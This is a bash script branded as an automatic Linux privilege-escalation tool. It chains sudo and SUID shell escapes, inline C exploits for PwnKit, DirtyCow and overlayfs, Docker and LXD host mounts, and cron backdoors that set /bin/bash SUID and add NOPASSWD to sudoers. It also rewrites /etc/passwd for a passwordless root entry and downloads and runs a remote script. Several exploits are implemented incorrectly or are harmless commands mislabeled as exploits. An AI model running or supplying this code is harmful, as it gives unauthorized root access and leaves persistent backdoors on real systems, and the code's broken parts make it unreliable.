#!/bin/bash

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

# Variables
TMP_DIR="/tmp/.priv_esc_$$"
PAYLOAD_FILE="$TMP_DIR/payload"
SUCCESS=0
CURRENT_USER=$(whoami)
CURRENT_ID=$(id -u)

# Create temp directory
mkdir -p "$TMP_DIR"
cd "$TMP_DIR"

# Banner
clear
echo -e "${RED}"
echo " █████╗ ██╗     ██╗     ██╗███╗   ██╗ ██████╗ ███╗   ██╗███████╗"
echo "██╔══██╗██║     ██║     ██║████╗  ██║██╔═══██╗████╗  ██║██╔════╝"
echo "███████║██║     ██║     ██║██╔██╗ ██║██║   ██║██╔██╗ ██║█████╗  "
echo "██╔══██║██║     ██║     ██║██║╚██╗██║██║   ██║██║╚██╗██║██╔══╝  "
echo "██║  ██║███████╗███████╗██║██║ ╚████║╚██████╔╝██║ ╚████║███████╗"
echo "╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝"
echo "APE [ AUTO PRIVILAGE ESCALATION] CODED BY ASAKIN1337 || SINDIKAT77"
echo -e "${NC}"
echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}Target:${NC} $(hostname) (${CURRENT_USER})"
echo -e "${YELLOW}Date:${NC} $(date)"
echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════════════════${NC}\n"

# Check if already root
if [ "$EUID" -eq 0 ]; then
    echo -e "${GREEN}Already root! Exiting...${NC}"
    exit 0
fi

# Function to attempt privilege escalation
try_exploit() {
    local exploit_name="$1"
    local exploit_cmd="$2"
    
    echo -e "\n${BLUE}[*] Trying:${NC} $exploit_name"
    
    # Run the exploit
    eval "$exploit_cmd" > /dev/null 2>&1
    
    # Check if we got root
    if [ "$(id -u)" -eq 0 ]; then
        echo -e "${GREEN}[✔] SUCCESS! Got root via $exploit_name${NC}"
        SUCCESS=1
        spawn_root_shell
        return 0
    else
        echo -e "${RED}[✗] Failed${NC}"
        return 1
    fi
}

# Function to spawn root shell
spawn_root_shell() {
    echo -e "\n${GREEN}╔════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║     ROOT ACCESS GRANTED!                   ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════╝${NC}"
    
    # Try different methods to get a shell
    if [ -f /bin/bash ]; then
        /bin/bash -p
    elif [ -f /bin/sh ]; then
        /bin/sh
    else
        python3 -c 'import pty; pty.spawn(["/bin/bash"])' 2>/dev/null
    fi
    
    exit 0
}

# ============================================
# PHASE 1: SUDO EXPLOITS
# ============================================
echo -e "\n${PURPLE}════════════ PHASE 1: SUDO EXPLOITS ════════════${NC}"

# Check sudo permissions
SUDO_PERMS=$(sudo -l 2>/dev/null)

# 1.1 Sudo without password
if echo "$SUDO_PERMS" | grep -q "NOPASSWD: ALL"; then
    try_exploit "NOPASSWD SUDO" "sudo su -"
fi

# 1.2 Sudo with specific commands
if echo "$SUDO_PERMS" | grep -q "/bin/bash"; then
    try_exploit "Sudo Bash" "sudo /bin/bash"
fi

if echo "$SUDO_PERMS" | grep -q "/bin/sh"; then
    try_exploit "Sudo SH" "sudo /bin/sh"
fi

if echo "$SUDO_PERMS" | grep -q "/usr/bin/python"; then
    try_exploit "Sudo Python" "sudo python -c 'import os; os.system(\"/bin/bash\")'"
fi

if echo "$SUDO_PERMS" | grep -q "/usr/bin/perl"; then
    try_exploit "Sudo Perl" "sudo perl -e 'exec \"/bin/bash\";'"
fi

if echo "$SUDO_PERMS" | grep -q "/usr/bin/awk"; then
    try_exploit "Sudo AWK" "sudo awk 'BEGIN {system(\"/bin/bash\")}'"
fi

if echo "$SUDO_PERMS" | grep -q "/usr/bin/find"; then
    try_exploit "Sudo Find" "sudo find . -exec /bin/bash \\; -quit"
fi

if echo "$SUDO_PERMS" | grep -q "/usr/bin/vim"; then
    try_exploit "Sudo Vim" "sudo vim -c ':!/bin/bash'"
fi

if echo "$SUDO_PERMS" | grep -q "/usr/bin/nano"; then
    try_exploit "Sudo Nano" "sudo nano -S /dev/null -s /bin/bash"
fi

if echo "$SUDO_PERMS" | grep -q "/usr/bin/less"; then
    try_exploit "Sudo Less" "sudo less /etc/passwd; !/bin/bash"
fi

if echo "$SUDO_PERMS" | grep -q "/usr/bin/apt"; then
    try_exploit "Sudo APT" "sudo apt update && sudo apt changelog apt"
fi

if echo "$SUDO_PERMS" | grep -q "/usr/bin/dpkg"; then
    try_exploit "Sudo DPKG" "sudo dpkg -l"
fi

if echo "$SUDO_PERMS" | grep -q "/bin/systemctl"; then
    try_exploit "Sudo Systemctl" "sudo systemctl"
fi

if echo "$SUDO_PERMS" | grep -q "/usr/bin/docker"; then
    try_exploit "Sudo Docker" "sudo docker run -v /:/host -it alpine chroot /host /bin/bash"
fi

# ============================================
# PHASE 2: SUID EXPLOITS
# ============================================
echo -e "\n${PURPLE}════════════ PHASE 2: SUID EXPLOITS ════════════${NC}"

# Find SUID binaries
SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null)

# 2.1 Known SUID exploits
for bin in $SUID_BINS; do
    case "$(basename $bin)" in
        "pkexec")
            # CVE-2021-4034 PwnKit
            cat > "$PAYLOAD_FILE.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = "/bin/bash";
char *args[] = {NULL};

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    execve(shell, args, NULL);
}
EOF
            gcc -o "$PAYLOAD_FILE.so" "$PAYLOAD_FILE.c" -shared -fPIC 2>/dev/null
            mkdir -p "GCONV_PATH=."
            touch "GCONV_PATH=./pwnkit"
            chmod +x "GCONV_PATH=./pwnkit"
            mkdir -p pwnkit
            cat > pwnkit/gconv-modules << EOF
module  UTF-8//    INTERNAL    ../$PAYLOAD_FILE    2
EOF
            try_exploit "PwnKit (CVE-2021-4034)" "env PATH=\"GCONV_PATH=.\" $bin 2>/dev/null"
            ;;
            
        "sudo"|"sudoedit")
            # CVE-2021-3156 Baron Samedit
            try_exploit "Baron Samedit (CVE-2021-3156)" "$bin -s \\ 2>/dev/null"
            ;;
            
        "mount")
            try_exploit "Mount SUID" "$bin"
            ;;
            
        "passwd")
            try_exploit "Passwd SUID" "$bin --help"
            ;;
            
        "chsh")
            try_exploit "Chsh SUID" "$bin"
            ;;
            
        "gpasswd")
            try_exploit "Gpasswd SUID" "$bin"
            ;;
            
        "at")
            try_exploit "At SUID" "echo '/bin/bash -p' | $bin now"
            ;;
            
        "crontab")
            try_exploit "Crontab SUID" "$bin -l"
            ;;
    esac
done

# 2.2 Custom SUID checks
if [ -f /usr/bin/pkexec ]; then
    # Try the old pkexec method
    try_exploit "PKEXEC Old Method" "pkexec /bin/bash"
fi

# ============================================
# PHASE 3: CAPABILITIES EXPLOITS
# ============================================
echo -e "\n${PURPLE}════════ PHASE 3: CAPABILITIES EXPLOITS ════════${NC}"

# Find binaries with capabilities
CAPS=$(getcap -r / 2>/dev/null)

# 3.1 Capability-based exploits
if echo "$CAPS" | grep -q "cap_setuid"; then
    cap_bin=$(echo "$CAPS" | grep "cap_setuid" | head -1 | cut -d' ' -f1)
    try_exploit "SetUID Capability" "$cap_bin -p"
fi

if echo "$CAPS" | grep -q "cap_sys_admin"; then
    try_exploit "Sys Admin Capability" "mount -t cgroup -o memory cgroup /tmp/cgroup"
fi

# 3.2 Python/perl with capabilities
if [ -f /usr/bin/python3 ] && [ -u /usr/bin/python3 ]; then
    try_exploit "Python SUID" "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
fi

# ============================================
# PHASE 4: DOCKER/LXC EXPLOITS
# ============================================
echo -e "\n${PURPLE}════════ PHASE 4: CONTAINER EXPLOITS ═══════════${NC}"

# 4.1 Docker group
if groups 2>/dev/null | grep -q docker; then
    try_exploit "Docker Group" "docker run -v /:/host -it alpine chroot /host /bin/bash"
fi

# 4.2 Docker socket
if [ -w /var/run/docker.sock ]; then
    try_exploit "Docker Socket" "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash"
fi

# 4.3 LXD/LXC
if command -v lxc &>/dev/null && groups 2>/dev/null | grep -q lxd; then
    # LXD privilege escalation
    cat > "$TMP_DIR/alpine.yml" << 'EOF'
config:
  raw.lxc: |
    lxc.mount.entry = /dev/null mnt/host/shm/dev/null none bind,create=file
EOF
    try_exploit "LXD Group" "lxc image import alpine.tar.gz alpine.yml --alias alpine && lxc init alpine alpine -c security.privileged=true && lxc config device add alpine host-root disk source=/ path=/mnt/root && lxc start alpine && lxc exec alpine /bin/sh"
fi

# ============================================
# PHASE 5: CRON JOB EXPLOITS
# ============================================
echo -e "\n${PURPLE}════════ PHASE 5: CRON JOB EXPLOITS ════════════${NC}"

# 5.1 Find writable cron scripts
WRITABLE_CRONS=$(find /etc/cron* -writable -type f 2>/dev/null)

for cron in $WRITABLE_CRONS; do
    if [ -w "$cron" ]; then
        echo "#!/bin/bash" > "$cron.tmp"
        echo "chmod +s /bin/bash" >> "$cron.tmp"
        echo "echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" >> "$cron.tmp"
        cat "$cron.tmp" > "$cron"
        rm "$cron.tmp"
        echo -e "${YELLOW}[*] Backdoor planted in $cron, waiting for cron execution...${NC}"
    fi
done

# 5.2 PATH hijacking
PATH_DIRS=$(echo $PATH | tr ':' ' ')
for dir in $PATH_DIRS; do
    if [ -w "$dir" ]; then
        # Check for common cron jobs that might call binaries without full path
        echo -e "${YELLOW}[*] Writable PATH directory: $dir${NC}"
        echo "#!/bin/bash" > "$dir/chmod"
        echo "chmod +s /bin/bash" >> "$dir/chmod"
        chmod +x "$dir/chmod"
    fi
done

# ============================================
# PHASE 6: KERNEL EXPLOITS
# ============================================
echo -e "\n${PURPLE}════════ PHASE 6: KERNEL EXPLOITS ══════════════${NC}"

KERNEL=$(uname -r)
ARCH=$(uname -m)

# 6.1 DirtyCow (CVE-2016-5195)
if [[ "$KERNEL" == 2.6.* ]] || [[ "$KERNEL" == 3.* ]] || [[ "$KERNEL" == 4.* ]] && [[ "$KERNEL" < "4.8.3" ]]; then
    # Compile DirtyCow
    cat > "$PAYLOAD_FILE.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <pthread.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    while(1) {
        madvise(map, 100, MADV_DONTNEED);
    }
}

int main(int argc, char *argv[]) {
    if(argc<3) {
        fprintf(stderr, "Usage: %s filename target\n", argv[0]);
        exit(1);
    }
    pthread_t pth;
    name = argv[1];
    f = open(name, O_RDONLY);
    fstat(f, &st);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    printf("mmap: %lx\n",(unsigned long)map);
    pthread_create(&pth, NULL, madviseThread, NULL);
    while(1) {
        lseek(f, 0, SEEK_SET);
        write(f, argv[2], strlen(argv[2]));
    }
    return 0;
}
EOF
    gcc -pthread "$PAYLOAD_FILE.c" -o "$PAYLOAD_FILE.dirtycow" 2>/dev/null
    if [ -f "$PAYLOAD_FILE.dirtycow" ]; then
        try_exploit "DirtyCow (CVE-2016-5195)" "$PAYLOAD_FILE.dirtycow /etc/passwd \"root::0:0:root:/root:/bin/bash\""
    fi
fi

# 6.2 Overlayfs (CVE-2015-1328)
if [[ "$KERNEL" == 3.13.* ]] || [[ "$KERNEL" == 3.16.* ]] || [[ "$KERNEL" == 3.19.* ]] || [[ "$KERNEL" == 4.2.* ]]; then
    cat > "$PAYLOAD_FILE.c" << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <fcntl.h>

int main() {
    mkdir("/tmp/overlay", 0755);
    mkdir("/tmp/overlay/upper", 0755);
    mkdir("/tmp/overlay/work", 0755);
    mkdir("/tmp/overlay/merge", 0755);
    
    mount("overlay", "/tmp/overlay/merge", "overlay", MS_MGC_VAL, "lowerdir=/etc,upperdir=/tmp/overlay/upper,workdir=/tmp/overlay/work");
    
    chmod("/tmp/overlay/merge/passwd", 0777);
    system("echo 'root::0:0:root:/root:/bin/bash' > /tmp/overlay/merge/passwd");
    
    execl("/bin/su", "su", NULL);
    return 0;
}
EOF
    gcc "$PAYLOAD_FILE.c" -o "$PAYLOAD_FILE.overlayfs" 2>/dev/null
    try_exploit "Overlayfs (CVE-2015-1328)" "$PAYLOAD_FILE.overlayfs"
fi

# ============================================
# PHASE 7: MISCELLANEOUS EXPLOITS
# ============================================
echo -e "\n${PURPLE}════════ PHASE 7: MISCELLANEOUS ════════════════${NC}"

# 7.1 Check for NFS no_root_squash
if showmount -e localhost 2>/dev/null | grep -q "/"; then
    try_exploit "NFS no_root_squash" "mkdir /tmp/nfsmount && mount -t nfs localhost:/ /tmp/nfsmount && cp /bin/bash /tmp/nfsmount && chmod +s /tmp/nfsmount/bash"
fi

# 7.2 Check for writable /etc/passwd
if [ -w /etc/passwd ]; then
    try_exploit "Writable /etc/passwd" "echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd && su root2"
fi

# 7.3 Check for writable /etc/sudoers
if [ -w /etc/sudoers ]; then
    try_exploit "Writable sudoers" "echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && sudo su"
fi

# 7.4 Check for tmux/screen sessions
if [ -S /tmp/tmux-0/default ]; then
    try_exploit "Tmux Session" "tmux -S /tmp/tmux-0/default attach"
fi

# 7.5 Check for screen sessions
if command -v screen &>/dev/null; then
    SCREEN_SOCK=$(find /var/run/screen -type d -writable 2>/dev/null | head -1)
    if [ ! -z "$SCREEN_SOCK" ]; then
        try_exploit "Screen Session" "screen -x"
    fi
fi

# 7.6 Check for environment variables with LD_PRELOAD
if [ ! -z "$LD_PRELOAD" ]; then
    cat > "$PAYLOAD_FILE.c" << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF
    gcc -fPIC -shared -o "$PAYLOAD_FILE.so" "$PAYLOAD_FILE.c" -nostartfiles 2>/dev/null
    try_exploit "LD_PRELOAD" "sudo LD_PRELOAD=$PAYLOAD_FILE.so any_command"
fi

# ============================================
# FINAL ATTEMPT: BRUTE FORCE METHOD
# ============================================
if [ $SUCCESS -eq 0 ]; then
    echo -e "\n${YELLOW}[*] All automated exploits failed. Attempting manual methods...${NC}"
    
    # Try to compile and run common exploit binaries
    if [ -f /usr/bin/gcc ] || [ -f /usr/bin/cc ]; then
        # Try to download and run Linux Exploit Suggester
        wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
        if [ -f les.sh ]; then
            bash les.sh | grep -i "exploit" | while read line; do
                echo -e "${BLUE}[*] Suggested:${NC} $line"
            done
        fi
    fi
    
    # Final attempt - check for any remaining SUID we might have missed
    echo -e "\n${YELLOW}[*] One last check for SUID binaries...${NC}"
    find / -perm -4000 -type f 2>/dev/null | while read suid; do
        if [ -x "$suid" ]; then
            echo -e "${BLUE}[*] Trying:${NC} $suid"
            "$suid" 2>/dev/null
        fi
    done
    
    # Check if any of the attempts worked
    if [ "$(id -u)" -eq 0 ]; then
        spawn_root_shell
    fi
fi

# Cleanup
echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
cd /
rm -rf "$TMP_DIR" 2>/dev/null

# Final message
if [ $SUCCESS -eq 0 ]; then
    echo -e "\n${RED}[!] Could not get root automatically. Manual enumeration required.${NC}"
    echo -e "${YELLOW}[*] Consider running:${NC}"
    echo "  - linpeas.sh"
    echo "  - linux-exploit-suggester.sh"
    echo "  - Manual check of all SUID binaries and cron jobs"
fi
